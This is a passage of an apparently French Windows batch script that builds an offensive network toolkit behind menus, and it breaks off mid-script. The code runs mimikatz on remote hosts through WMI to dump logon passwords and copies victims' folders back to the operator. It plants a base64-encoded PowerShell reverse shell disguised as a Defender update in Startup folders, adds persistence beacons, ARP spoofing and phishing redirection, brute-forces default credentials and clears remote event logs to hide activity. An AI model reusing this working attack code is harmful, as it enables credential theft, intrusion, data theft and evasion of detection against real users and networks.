    echo  [-] mimikatz.exe introuvable sur ce PC.
    echo  [i] Placez mimikatz.exe dans : %~dp0
    echo  [i] Ou dans C:\Tools\
    echo.
    pause
    goto wan_post_creds
)
echo  [+] Detecte : !mimi_path!
echo  [*] Copie via C$ + execution WMI...
set "PEX_MIMI=!mimi_path!"
set "PEX_PS=%TEMP%\pex_mimi_%RANDOM%.ps1"
>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP;$h=$env:PEX_HOST;$mimi=$env:PEX_MIMI
>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
>> "%PEX_PS%" echo $tmp="mimi_$(Get-Random)"
>> "%PEX_PS%" echo try {
>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
>> "%PEX_PS%" echo   Copy-Item $mimi "\\$h\C$\Windows\Temp\$tmp.exe" -Force
>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c C:\Windows\Temp\$tmp.exe ""privilege::debug sekurlsa::logonpasswords exit"" > C:\Windows\Temp\$tmp.txt 2>&1" -ComputerName $ip -Credential $cr -EA Stop
>> "%PEX_PS%" echo   Start-Sleep 5
>> "%PEX_PS%" echo   Get-Content "\\$h\C$\Windows\Temp\$tmp.txt" -EA SilentlyContinue ^| ForEach-Object { Write-Host "  $_" }
>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c del /f /q C:\Windows\Temp\$tmp.exe C:\Windows\Temp\$tmp.txt" -ComputerName $ip -Credential $cr
>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
if exist "%PEX_PS%" del /f /q "%PEX_PS%"
echo.
pause
goto wan_post_creds

REM --- Exfiltration ---
:pex_exfil
cls
echo.
echo  [EXFIL] EXFILTRATION - !remote_ip!
echo.
call :DynamicMenu "EXFILTRER" "Documents~C:\Users\[user]\Documents;Bureau~C:\Users\[user]\Desktop;Images~C:\Users\[user]\Pictures;Telechargements~C:\Users\[user]\Downloads;Musique~C:\Users\[user]\Music;Videos~C:\Users\[user]\Videos;Chemin personnalise~Entrer un chemin distant;Retour" "NONUMS NOCLS"
set "exfil_ch=%errorlevel%"
if "%exfil_ch%"=="0" goto wan_post_creds
set "exfil_src="
if "%exfil_ch%"=="1" set "exfil_src=C:\Users\!cred_u!\Documents"
if "%exfil_ch%"=="2" set "exfil_src=C:\Users\!cred_u!\Desktop"
if "%exfil_ch%"=="3" set "exfil_src=C:\Users\!cred_u!\Pictures"
if "%exfil_ch%"=="4" set "exfil_src=C:\Users\!cred_u!\Downloads"
if "%exfil_ch%"=="5" set "exfil_src=C:\Users\!cred_u!\Music"
if "%exfil_ch%"=="6" set "exfil_src=C:\Users\!cred_u!\Videos"
if "%exfil_ch%"=="7" (
    call :InputWithEsc "  Chemin distant (ex: C:\Users\Alex\AppData) : " exfil_src
    if errorlevel 1 goto pex_exfil
    if not defined exfil_src goto pex_exfil
)
if "%exfil_ch%"=="8" goto wan_post_creds
REM --- Nettoyer remote_pc des caracteres invalides pour un chemin ---
set "exfil_tag=!remote_pc!"
if not defined exfil_tag set "exfil_tag=%RANDOM%"
set "exfil_tag=!exfil_tag:?=!"
set "exfil_tag=!exfil_tag:(=!"
set "exfil_tag=!exfil_tag:)=!"
set "exfil_tag=!exfil_tag: =_!"
set "exfil_tag=!exfil_tag:/=!"
set "exfil_tag=!exfil_tag:\=!"
set "exfil_tag=!exfil_tag::=!"
set "exfil_tag=!exfil_tag:*=!"
set "exfil_tag=!exfil_tag:"=!"
set "exfil_dst=%USERPROFILE%\Desktop\Exfil_!exfil_tag!"
echo  [*] Copie de : !exfil_src!
echo  [*] Vers     : !exfil_dst!
echo.
set "PEX_SRC=!exfil_src!"
set "PEX_DST=!exfil_dst!"
set "PEX_PS=%TEMP%\pex_exfil_%RANDOM%.ps1"
>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$h=$env:PEX_HOST;$src=$env:PEX_SRC;$dst=$env:PEX_DST
>> "%PEX_PS%" echo try {
>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
>> "%PEX_PS%" echo   $smb_src = "\\$h\C$\" + ($src -replace '^[A-Za-z]:\\','')
>> "%PEX_PS%" echo   Write-Host "  [*] Source SMB : $smb_src" -f DarkGray
>> "%PEX_PS%" echo   if (-not (Test-Path $dst)) { $null=New-Item $dst -ItemType Directory -Force }
>> "%PEX_PS%" echo   Copy-Item $smb_src $dst -Recurse -Force -EA Stop
>> "%PEX_PS%" echo   Write-Host "  [+] Copie terminee : $dst" -f Green
>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red; net use "\\$h\C$" /delete ^>$null 2^>$null }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
if exist "%PEX_PS%" del /f /q "%PEX_PS%"
echo.
pause
goto pex_exfil

REM --- Pivot ---
:pex_pivot
cls
echo.
echo  [PIVOT] RESEAU INTERNE - !remote_ip!
echo  [i] Execute arp + scan ping depuis la cible via WMI
echo.
set "PEX_PS=%TEMP%\pex_pivot_%RANDOM%.ps1"
set "PEX_CMD=arp -a"
>> "%PEX_PS%" echo $u=$env:PEX_USER;$p=$env:PEX_PASS;$ip=$env:PEX_IP;$h=$env:PEX_HOST
>> "%PEX_PS%" echo $ss=ConvertTo-SecureString $p -AsPlainText -Force
>> "%PEX_PS%" echo $cr=New-Object PSCredential($u,$ss)
>> "%PEX_PS%" echo $tmp="pex_$(Get-Random).txt"
>> "%PEX_PS%" echo try {
>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c arp -a > C:\Windows\Temp\$tmp 2>&1" -ComputerName $ip -Credential $cr -EA Stop
>> "%PEX_PS%" echo   Start-Sleep 2
>> "%PEX_PS%" echo   net use "\\$h\C$" $p /user:$u ^>$null 2^>$null
>> "%PEX_PS%" echo   Write-Host "  [ARP] Table de la cible :" -f Yellow
>> "%PEX_PS%" echo   Get-Content "\\$h\C$\Windows\Temp\$tmp" -EA SilentlyContinue ^| ForEach-Object { Write-Host "  $_" }
>> "%PEX_PS%" echo   $null=Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c del /f /q C:\Windows\Temp\$tmp" -ComputerName $ip -Credential $cr
>> "%PEX_PS%" echo   net use "\\$h\C$" /delete ^>$null 2^>$null
>> "%PEX_PS%" echo } catch { Write-Host "  [ERR] $($_.Exception.Message)" -f Red }
powershell -NoProfile -ExecutionPolicy Bypass -File "%PEX_PS%"
if exist "%PEX_PS%" del /f /q "%PEX_PS%"
echo.
pause
goto wan_post_creds

:start_lan_scan
echo.
echo  [i] Demarrage du Scan des failles... Appuyez sur ECHAP pour annuler.
echo.
set "SCPS=%TEMP%\advanced_turbo_scan.ps1"
if exist "%SCPS%" del "%SCPS%"

>  "%SCPS%" echo $oui = @{'B8-27-EB'='Raspberry Pi';'DC-A6-32'='Raspberry Pi';'E4-5F-01'='Raspberry Pi';'00-1E-C2'='Apple';'AC-87-A3'='Apple';'64-16-7F'='Apple';'A4-77-33'='Samsung';'48-D6-D5'='Xiaomi';'00-1A-11'='Google';'00-FF-BB'='Microsoft';'38-07-16'='Freebox';'E4-9E-12'='Freebox';'00-11-32'='Synology'}
>> "%SCPS%" echo $targetInput = "%base_ip%"
>> "%SCPS%" echo if ($targetInput -eq 'AUTO') {
>> "%SCPS%" echo     $route = Get-NetRoute -DestinationPrefix '0.0.0.0/0' ^| Sort-Object RouteMetric ^| Select-Object -First 1
>> "%SCPS%" echo     $myIp = (Get-NetIPAddress -InterfaceIndex $route.InterfaceIndex -AddressFamily IPv4).IPAddress
>> "%SCPS%" echo     $base = ($myIp -split '\.')[0..2] -join '.'
>> "%SCPS%" echo     $ipsToScan = 1..254 ^| ForEach-Object { "$base.$_" }
>> "%SCPS%" echo     Write-Host "  Cible   : $base.1 a $base.254" -f Cyan
>> "%SCPS%" echo } elseif ($targetInput -match '^\d{1,3}\.\d{1,3}\.\d{1,3}$') {
>> "%SCPS%" echo     $ipsToScan = 1..254 ^| ForEach-Object { "$targetInput.$_" }
>> "%SCPS%" echo     Write-Host "  Cibles  : $targetInput.1 a $targetInput.254" -f Cyan
>> "%SCPS%" echo } else {
>> "%SCPS%" echo     $ipsToScan = @($targetInput)
>> "%SCPS%" echo     Write-Host "  Cible   : $targetInput" -f Cyan
>> "%SCPS%" echo }
>> "%SCPS%" echo $jobs = $ipsToScan ^| ForEach-Object {
>> "%SCPS%" echo     $target = $_
>> "%SCPS%" echo     [PowerShell]::Create().AddScript({
>> "%SCPS%" echo         param($ip, $ouiMap)
>> "%SCPS%" echo         $res = @{ IP = $ip; Status = 'Down'; Name = ''; Brand = 'Inconnu'; Ports = @() }
>> "%SCPS%" echo         $p = New-Object System.Net.NetworkInformation.Ping
>> "%SCPS%" echo         try {
>> "%SCPS%" echo             $reply = $p.Send($ip, 400)
>> "%SCPS%" echo             if ($reply.Status -eq 'Success') {
>> "%SCPS%" echo                 $res.Status = 'Up'
>> "%SCPS%" echo                 try { $res.Name = [System.Net.Dns]::GetHostEntry($ip).HostName } catch { $res.Name = "Inconnu" }
>> "%SCPS%" echo                 $arp = Get-NetNeighbor -IPAddress $ip -EA SilentlyContinue ^| Select-Object -First 1
>> "%SCPS%" echo                 if ($arp) {
>> "%SCPS%" echo                     $mac = $arp.LinkLayerAddress.ToUpper().Replace(':','-')
>> "%SCPS%" echo                     $prefix = if($mac.Length -ge 8){$mac.Substring(0,8)}else{''}
>> "%SCPS%" echo                     if ($ouiMap.ContainsKey($prefix)) { $res.Brand = $ouiMap[$prefix] }
>> "%SCPS%" echo                 }
>> "%SCPS%" echo                 $testPorts = @(21, 22, 23, 80, 443, 445, 3389, 8080)
>> "%SCPS%" echo                 foreach ($pt in $testPorts) {
>> "%SCPS%" echo                     $tcp = New-Object System.Net.Sockets.TcpClient
>> "%SCPS%" echo                     try {
>> "%SCPS%" echo                         $connect = $tcp.BeginConnect($ip, $pt, $null, $null)
>> "%SCPS%" echo                         if ($connect -and $connect.AsyncWaitHandle.WaitOne(70, $false) -and $tcp.Connected) { $res.Ports += $pt }
>> "%SCPS%" echo                     } catch {} finally { $tcp.Close() }
>> "%SCPS%" echo                 }
>> "%SCPS%" echo             }
>> "%SCPS%" echo         } catch {}
>> "%SCPS%" echo         return $res
>> "%SCPS%" echo     }).AddArgument($target).AddArgument($oui)
>> "%SCPS%" echo }
>> "%SCPS%" echo $running = $jobs ^| ForEach-Object { @{ Obj = $_; Async = $_.BeginInvoke(); IP = $_.Commands.Commands[0].Parameters[0].Value } }
>> "%SCPS%" echo while ($running.Count -gt 0) {
>> "%SCPS%" echo     if ($Host.UI.RawUI.KeyAvailable) { if ($Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown').VirtualKeyCode -eq 27) { break } }
>> "%SCPS%" echo     $done = $running ^| Where-Object { $_.Async.IsCompleted -eq $true }
>> "%SCPS%" echo     foreach ($j in $done) {
>> "%SCPS%" echo         $r = $j.Obj.EndInvoke($j.Async)
>> "%SCPS%" echo         if ($r.Status -eq 'Up') {
>> "%SCPS%" echo             Write-Host ("`r" + " " * 100 + "`r") -NoNewline
>> "%SCPS%" echo             Write-Host "  [+] $($r.IP.PadRight(15))" -NoNewline -f Green
>> "%SCPS%" echo             Write-Host " - $($r.Brand) " -NoNewline -f Yellow
>> "%SCPS%" echo             Write-Host "($($r.Name))" -f Gray
>> "%SCPS%" echo             if ($r.Ports.Count -gt 0) { Write-Host "      Ports ouverts : $($r.Ports -join ', ')" -f Cyan }
>> "%SCPS%" echo             if ($r.Ports -contains 445) { Write-Host "      [!] Faille potentielle critique : SMB" -f Red }
>> "%SCPS%" echo             if ($r.Ports -contains 3389) { Write-Host "      [!] RDP Ouvert (Risque d'attaque/Bruteforce)" -f Yellow }
>> "%SCPS%" echo             if ($r.Ports -contains 21 -or $r.Ports -contains 23) { Write-Host "      [!] Protocoles en texte clair securite faible (FTP/Telnet)" -f Red }
>> "%SCPS%" echo             if ($r.Ports -contains 5985) { Write-Host "      [!] WinRM Actif" -f Yellow }
>> "%SCPS%" echo             $r.IP ^| Out-File -Append "%TEMP%\found_ips.txt" -Encoding ASCII
>> "%SCPS%" echo         }
>> "%SCPS%" echo         $running = $running ^| Where-Object { $_.Async -ne $j.Async }
>> "%SCPS%" echo     }
>> "%SCPS%" echo     if ($running.Count -gt 0) { Write-Host ("`r  [>] Analyse IP : $($running[0].IP.PadRight(15)) ($($running.Count) restantes)...") -NoNewline -f DarkGray }
>> "%SCPS%" echo     Start-Sleep -m 20
>> "%SCPS%" echo }

if exist "%TEMP%\found_ips.txt" del "%TEMP%\found_ips.txt"
powershell -NoProfile -ExecutionPolicy Bypass -File "%SCPS%"
if exist "%SCPS%" del "%SCPS%"

echo.
set "opts=Audit de penetration ^& Brute Force~Analyse exhaustive des ports et test des acces par defaut via base RockYou.;Lister les partages Windows (SMB) ^& Enumeration~Identification des dossiers reseau et extraction utilisateurs via IPC$.;Post-Exploitation (Explorer une cible compromise)~Naviguer dans les fichiers distants, recuperer des infos systeme ou dumper le Bureau.;Retour~Retour au menu principal"
call :DynamicMenu "SCAN TERMINE !" "%opts%" "NONUMS NOCLS"
set "nxt=%errorlevel%"
if "%nxt%"=="1" goto lan_all_deep
if "%nxt%"=="2" goto lan_all_smb
if "%nxt%"=="3" goto cyber_smb_explorer
if defined _net_back goto %_net_back%
goto net_cyber_menu

:cyber_smb_explorer
cls
echo.
echo  ================================================
echo   EXPLORATEUR FURTIF ET ANTI-FORENSICS
echo  ================================================
if not exist "%TEMP%\found_ips.txt" (
    echo [!] Aucune cible connue.
    pause & goto net_cyber_menu
)

echo Cibles detectees :
type "%TEMP%\found_ips.txt"
echo.
set /p "target_ip=IP de la cible a explorer : "
if "%target_ip%"=="" goto net_cyber_menu

:smb_exp_menu
cls
echo  Cible : %target_ip% ^| MODE : EXPERT
echo  ------------------------------------------------
set "opts=Lister C:;Explorer le Bureau;Infos Systeme;Installer Persistance;Reverse Shell B64;Dumping Documents;NETTOYER LES LOGS;MITM / Spoofing;EXFILTRATION (Discord/Telegram);AUDIT EXPOSITION;Retour"
call :DynamicMenu "PENTEST EXPERT : %target_ip%" "%opts%" "NONUMS"
set "smb_sel=%errorlevel%"

if "%smb_sel%"=="1" (
    cls ^& echo Liste de C:\ sur %target_ip% :
    dir "\\%target_ip%\C$" /A /B 2^>nul
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="2" (
    cls ^& echo Liste des profils :
    dir "\\%target_ip%\C$\Users" /B /A:D 2^>nul
    set /p "user_target=User : "
    if not "!user_target!"=="" dir "\\%target_ip%\C$\Users\!user_target!\Desktop"
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="3" (
    cls ^& echo Infos systeme de %target_ip% :
    systeminfo /S %target_ip%
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="4" (
    cls
    echo [i] Configuration du Beacon de persistance...
    if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
    set "remote_startup=\\%target_ip%\C$\Users\%user_target%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    if not exist "!remote_startup!" (
        echo [!] Chemin Startup introuvable.
        pause ^& goto smb_exp_menu
    )
    >  "%TEMP%\win_sync.bat" echo @echo off
    >> "%TEMP%\win_sync.bat" echo powershell -nop -w hidden -c "Add-Content -Path '\\%COMPUTERNAME%\C$\Users\%USERNAME%\Desktop\victimes.log' -Value ('[ONLINE] ' + $env:COMPUTERNAME + ' at ' + (Get-Date))"
    copy "%TEMP%\win_sync.bat" "!remote_startup!\WinSync.bat" /Y ^>nul
    echo [OK] Persistance installee.
    del "%TEMP%\win_sync.bat" 2^>nul
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="5" (
    cls
    echo [!] Generation de la Reverse Shell B64 (Bypass Defender)...
    for /f "tokens=4" %%a in ('route print ^| findstr 0.0.0.0 ^| findstr /v 127.0.0.1') do set "MYIP=%%a"
    set "MYIP=!MYIP: =!"
    if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
    set "remote_startup=\\%target_ip%\C$\Users\%user_target%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
    
    REM Prepare la commande PowerShell pure
    set "ps_cmd=$c=New-Object Net.Sockets.TCPClient('!MYIP!',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()"
    
    REM Encodage B64 pour bypasser Defender
    powershell -NoProfile -Command "$bytes = [System.Text.Encoding]::Unicode.GetBytes('!ps_cmd!'); $encoded = [Convert]::ToBase64String($bytes); 'powershell -nop -w hidden -enc ' + $encoded | Out-File '%TEMP%\enc_rev.txt' -Encoding ASCII"
    set /p B64_PAYLOAD=<"%TEMP%\enc_rev.txt"
    
    >  "%TEMP%\win_def_update.bat" echo @echo off
    >> "%TEMP%\win_def_update.bat" echo !B64_PAYLOAD!
    
    copy "%TEMP%\win_def_update.bat" "!remote_startup!\WindowsDefenderUpdate.bat" /Y ^>nul
    echo [OK] Reverse shell obfusquee injectee !
    echo [!] Ecoutez sur votre PC (Port 4444) : powershell ncat -lvp 4444
    del "%TEMP%\enc_rev.txt" 2^>nul
    del "%TEMP%\win_def_update.bat" 2^>nul
    pause ^& goto smb_exp_menu
)
if "%smb_sel%"=="6" goto smb_dump_action
if "%smb_sel%"=="7" goto smb_cleanup_logs
if "%smb_sel%"=="8" goto cyber_mitm_module
if "%smb_sel%"=="9" goto cyber_exfiltrate_webhook
if "%smb_sel%"=="10" goto cyber_exposure_audit
goto net_cyber_menu

REM ===================================================================
REM       NOUVEAU MODULE : INTERCEPTION MITM (ARP SPOOFING)
REM ===================================================================
:cyber_mitm_module
cls
echo.
echo  ================================================
echo   MODULE D'INTERCEPTION MAN-IN-THE-MIDDLE
echo  ================================================
echo.
echo   [1] Lancer ARP Spoofing (Detournement de trafic)
echo       Fait passer tout le trafic de la cible par ton PC.
echo.
echo   [2] Sniffer le trafic HTTP (Mots de passe clairs)
echo       Cherche les identifiants tapes sur les sites non-securises.
echo.
echo   [3] DNS Poisoning (Redirection vers faux sites)
echo       Redirige la victime vers une IP de ton choix.
echo.
echo   [4] Retour
echo.
set /p "mitm_choice=Action : "

if "%mitm_choice%"=="1" goto mitm_spoof
if "%mitm_choice%"=="2" goto mitm_sniff
if "%mitm_choice%"=="3" goto mitm_dns
goto smb_exp_menu

:mitm_spoof
cls
echo [!] RECUPERATION DE LA PASSERELLE...
for /f "tokens=3" %%a in ('netsh interface ip show config ^| findstr "Passerelle par d"') do set "GW=%%a"
echo Cible     : %target_ip%
echo Passerelle: %GW%
echo.
echo [i] Lancement de l'empoisonnement ARP via PowerShell...
echo [i] Appuyez sur CTRL+C pour arreter.
echo.
powershell -Command "$t='%target_ip%'; $g='%GW%'; while($true){ arp -s $t (get-netadapter | where status -eq 'up').MacAddress; arp -s $g (get-netadapter | where status -eq 'up').MacAddress; Write-Host 'Envoi paquets empoisonnes...' -f Yellow; Start-Sleep -s 2 }"
pause ^& goto cyber_mitm_module

:mitm_sniff
cls
echo  ================================================
echo   SNIFFER DE MOTS DE PASSE (HTTP)
echo  ================================================
echo  Analyse des paquets entrants en cours...
echo  (Requiert le mode Spoofing actif dans une autre fenetre)
echo.
powershell -Command "Write-Host 'En attente de donnees POST/GET...' -f Cyan; $adapter = Get-NetAdapter | Where Status -eq 'Up' | Select-Object -First 1; netsh trace start capture=yes report=no tracefile=$env:TEMP\trace.etl; Write-Host 'Capture en cours... Appuyez sur une touche pour stopper et extraire.' -f Yellow; $null = [Console]::ReadKey(); netsh trace stop; Write-Host 'Analyse du fichier trace...' -f Gray"
echo.
echo [INFO] Pour voir les mots de passe, ouvrez le fichier %TEMP%\trace.etl avec Wireshark.
pause ^& goto cyber_mitm_module

:mitm_dns
cls
echo.
echo  ================================================
echo   DNS POISONING (REDIRECTION DE SITES)
echo  ================================================
echo   Description : Intercepte les requetes DNS pour 
echo   envoyer la victime vers ton IP au lieu du vrai site.
echo.
set /p "site_cible=Domaine a detourner (ex: facebook.com) : "
if not defined site_cible goto cyber_mitm_module
set /p "votre_ip=IP de votre serveur de phishing : "
if not defined votre_ip goto cyber_mitm_module

echo [i] Configuration de la table de redirection...
REM On utilise le fichier 'hosts' local pour simuler le poisoning si on est en MITM
(
echo %votre_ip% %site_cible%
echo %votre_ip% www.%site_cible%
) > "%TEMP%\dns_table.txt"

echo.
echo [OK] Redirection active. 
echo [!] Note : Pour que cela fonctionne, l'ARP Spoofing (Option 1)
echo     doit etre actif et ton PC doit faire tourner un serveur Web.
echo.
echo [i] Conseil : Utilise 'Python -m http.server 80' pour tester.
pause & goto cyber_mitm_module

REM --- FONCTIONS DE NETTOYAGE ET DUMPING AMELIOREES ---
:smb_dump_action
cls
echo [DUMPING] Collecte des documents sensibles...
if "!user_target!"=="" set /p "user_target=Utilisateur cible : "
set "DUMP_DIR=%USERPROFILE%\Desktop\DUMP_%target_ip%"
if not exist "!DUMP_DIR!" mkdir "!DUMP_DIR!" 2^>nul
echo [+] Copie des fichiers .txt, .pdf, .docx du Bureau et des Documents...
xcopy "\\%target_ip%\C$\Users\%user_target%\Desktop\*.txt" "%DUMP_DIR%\" /Y /Q /S /I 2^>nul
xcopy "\\%target_ip%\C$\Users\%user_target%\Documents\*.pdf" "%DUMP_DIR%\" /Y /Q /S /I 2^>nul
echo [OK] Dumping termine dans : Bureau\DUMP_%target_ip%
pause ^& goto smb_exp_menu

:smb_cleanup_logs
cls
echo [!] Nettoyage des traces sur %target_ip%...
powershell -NoProfile -Command "Invoke-Command -ComputerName %target_ip% -ScriptBlock { Get-WinEvent -ListLog * | ForEach-Object { try { [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) } catch {} } }" 2^>nul
if %errorlevel% neq 0 (
    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''System''' call cleareventlog" ^>nul
    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''Security''' call cleareventlog" ^>nul
    powershell -Command "wmic /node:'%target_ip%' nteventlog where 'LogfileName=''Application''' call cleareventlog" ^>nul
)
echo [OK] Logs effaces. Furtivite assuree.
pause ^& goto smb_exp_menu

:lan_all_deep
cls
echo.
echo  ================================================
echo   AUDIT DE PENETRATION ^& BRUTE FORCE (REAL LEAKS)
echo  ================================================
if not exist "%TEMP%\found_ips.txt" (
    echo [!] Aucune cible detectee. Lancez d'abord un scan reseau.
    pause & goto net_cyber_menu
)

set "SCRIPT_DIR=%~dp0"
if "%SCRIPT_DIR:~-1%"=="\" set "SCRIPT_DIR=%SCRIPT_DIR:~0,-1%"
set "BRUTE_FILE=%SCRIPT_DIR%\bruteforce.txt"
set "SUCCESS_LOG=%SCRIPT_DIR%\penetration_success.log"

if not exist "%BRUTE_FILE%" (
    echo [i] Creation du dictionnaire bruteforce.txt...
    >  "%BRUTE_FILE%" echo admin:admin
    >> "%BRUTE_FILE%" echo admin:password
    >> "%BRUTE_FILE%" echo admin:123456
    >> "%BRUTE_FILE%" echo root:root
    >> "%BRUTE_FILE%" echo root:toor
    >> "%BRUTE_FILE%" echo user:123456
    >> "%BRUTE_FILE%" echo pi:raspberry
)

echo [i] Succes enregistres dans : penetration_success.log
echo.

set "SCDP=%TEMP%\aggressive_audit.ps1"
>  "%SCDP%" echo $ips = Get-Content "%TEMP%\found_ips.txt"
>> "%SCDP%" echo $creds = Get-Content "%BRUTE_FILE%"
>> "%SCDP%" echo foreach ($ip in $ips) {
>> "%SCDP%" echo     if ([string]::IsNullOrWhiteSpace($ip)) { continue }
>> "%SCDP%" echo     Write-Host ">>> ANALYSE PROFONDE : $ip" -f Cyan -b Black
>> "%SCDP%" echo     $ports = @(21,22,23,80,443,445,3389,8080)
>> "%SCDP%" echo     $openPorts = @()
>> "%SCDP%" echo     foreach ($port in $ports) {
>> "%SCDP%" echo         $socket = New-Object System.Net.Sockets.TcpClient
>> "%SCDP%" echo         try {
>> "%SCDP%" echo             $connect = $socket.BeginConnect($ip, $port, $null, $null)
>> "%SCDP%" echo             if ($connect.AsyncWaitHandle.WaitOne(100, $false) -and $socket.Connected) {
>> "%SCDP%" echo                 Write-Host "  [+] Port $port OUVERT" -f Green
>> "%SCDP%" echo                 $openPorts += $port
>> "%SCDP%" echo                 $stream = $socket.GetStream()
>> "%SCDP%" echo                 $stream.Write([System.Text.Encoding]::ASCII.GetBytes("`r`n"), 0, 2)
>> "%SCDP%" echo                 Start-Sleep -m 150
>> "%SCDP%" echo                 if ($socket.Available -gt 0) {
>> "%SCDP%" echo                     $buf = New-Object byte[] 1024
>> "%SCDP%" echo                     $len = $stream.Read($buf, 0, 1024)
>> "%SCDP%" echo                     $banner = [System.Text.Encoding]::ASCII.GetString($buf, 0, $len).Trim() -replace '[^a-zA-Z0-9\/\.\_\-\ ]',''
>> "%SCDP%" echo                     if($banner){ Write-Host "      > Version : $banner" -f Gray }
>> "%SCDP%" echo                 }
>> "%SCDP%" echo             }
>> "%SCDP%" echo         } catch {} finally { $socket.Close() }
>> "%SCDP%" echo     }
>> "%SCDP%" echo     foreach ($port in $openPorts) {
>> "%SCDP%" echo         if ($port -eq 80 -or $port -eq 8080) {
>> "%SCDP%" echo             Write-Host "      [~] Test Brute Force HTTP..." -f DarkGray
>> "%SCDP%" echo             foreach($line in $creds) {
>> "%SCDP%" echo                 $u, $p = $line.Split(':'); if($null -eq $p){$p=""}
>> "%SCDP%" echo                 try {
>> "%SCDP%" echo                     $pair = "$u`:$p"; $bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
>> "%SCDP%" echo                     $h = @{Authorization="Basic $([Convert]::ToBase64String($bytes))"}
>> "%SCDP%" echo                     $r = Invoke-WebRequest -Uri "http://${ip}:$port" -Headers $h -TimeoutSec 1 -ErrorAction Stop -UseBasicParsing
>> "%SCDP%" echo                     if ($r.StatusCode -eq 200) { 
>> "%SCDP%" echo                         Write-Host "      [!!!] ACCES TROUVE : $u / $p" -f Red -b White
>> "%SCDP%" echo                         "[SUCCESS] ${ip}:$port | $u / $p" ^| Out-File "%SUCCESS_LOG%" -Append; break 
>> "%SCDP%" echo                     }
>> "%SCDP%" echo                 } catch {}
>> "%SCDP%" echo             }
>> "%SCDP%" echo         }
>> "%SCDP%" echo     }
>> "%SCDP%" echo     Write-Host "------------------------------------------------" -f DarkGray
>> "%SCDP%" echo }

powershell -NoProfile -ExecutionPolicy Bypass -File "%SCDP%"
if exist "%SCDP%" del "%SCDP%"

echo.
echo [OK] Audit termine.
if exist "%SUCCESS_LOG%" (
    echo [i] Des succes ont ete detectes. Tentative d'envoi par mail...
    call :SendAuditMail "%SUCCESS_LOG%" "Succes de Penetration"
) else (
    echo [-] Aucun acces trouve, aucun mail envoye.
)
pause
goto net_cyber_menu

:lan_all_smb
cls
echo.
echo  ================================================
echo   AUDIT SMB ET ENUMERATION (IPC$)
echo  ================================================
set "SMBPS=%TEMP%\smb_audit.ps1"
>  "%SMBPS%" echo $ips = Get-Content "%TEMP%\found_ips.txt"
>> "%SMBPS%" echo foreach ($ip in $ips) {
>> "%SMBPS%" echo     if ([string]::IsNullOrWhiteSpace($ip)) { continue }
>> "%SMBPS%" echo     Write-Host ">>> CIBLE SMB : $ip" -f Cyan
>> "%SMBPS%" echo     net view "\\$ip" /all 2^>$null ^| ForEach-Object { Write-Host "  $_" -f Gray }
>> "%SMBPS%" echo     Write-Host "  [~] Test acces anonyme..." -f DarkGray
>> "%SMBPS%" echo     $test = net use "\\$ip\IPC$" "" /u:"" 2^>^&1
>> "%SMBPS%" echo     if ($test -match 'reussie^|completed') { Write-Host "  [!!!] SESSION ANONYME OUVERTE" -f Red; net use "\\$ip\IPC$" /d /y ^>$null }
>> "%SMBPS%" echo     Write-Host "------------------------------------" -f DarkGray
>> "%SMBPS%" echo }
powershell -NoProfile -ExecutionPolicy Bypass -File "%SMBPS%"
if exist "%SMBPS%" del "%SMBPS%"

echo.
echo Audit SMB termine.
pause
goto net_cyber_menu


:cyber_exposed_files
cls
echo.
echo  ===========================================================
echo   SCAN FICHIERS SENSIBLES EXPOSES
echo  ===========================================================
echo   Detecte les fichiers critiques (.env, .git)
echo   laisses par erreur sur un serveur web.
echo.
echo  Entrez l'URL cible (ex: https://monsite.com)
set "ALEEX_EXPOSED_URL="
set /p "ALEEX_EXPOSED_URL=URL : "
if not defined ALEEX_EXPOSED_URL goto net_cyber_menu

set "EFS=%TEMP%\exposed_files.ps1"
if exist "%EFS%" del /f /q "%EFS%"

echo $url = $env:ALEEX_EXPOSED_URL.TrimEnd('/') >> "%EFS%"
echo $ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" >> "%EFS%"
echo $found = 0 >> "%EFS%"
echo $paths = @( >> "%EFS%"
echo    # Configs et secrets >> "%EFS%"
